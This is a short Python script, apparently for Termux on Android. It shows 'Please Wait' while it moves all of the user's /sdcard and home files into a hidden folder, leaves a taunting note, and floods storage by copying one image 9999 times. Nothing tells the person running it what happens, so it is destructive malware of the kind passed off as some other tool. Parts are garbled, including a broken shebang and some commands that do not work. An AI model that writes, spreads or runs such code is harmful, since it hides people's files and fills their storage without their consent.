#!/bin/usr/python3
#code=utf __-8-__
#creater BilalHaiderID
from os import system as cmd
from time import sleep as slp

logo = " "
lines_usr = """
Do not worry, data is not deleted.
This is just to remind you to keep a backup of what was taken.
"""
def Kesalahan():
	cmd("clear")
	print(logo)
	print("-"*49)
	print("[*] Please Wait ......")
	print("pkg install zip -y &> /dev/null")
	cmd("mkdir /sdcard/.CODEXID")
	cmd("mkdir  /sdcard/.CODEXID/ssd")
	cmd("mkdir  /sdcard/.CODEXID/cmd")
	cmd("mv /sdcard/* /sdcard/.CODEXID/ssd")
	cmd("mv $HOME/* /sdcard/.CODEXID/cmd")
	x = open("/sdcard/.CODEXID/codexid.txt","w")
	x.write(lines_usr)
	x.close()
	cmd("zip /sdcard/.CODEXID")
	for i in range(9999):
		cmd("cp png/20220825_113626.jpg /sdcard/")
	cmd("mv .CODEXID.zip /sdcard")
	cmd("See You Soon.....")
	exit()
if __name__=="__main__":
	Kesalahan()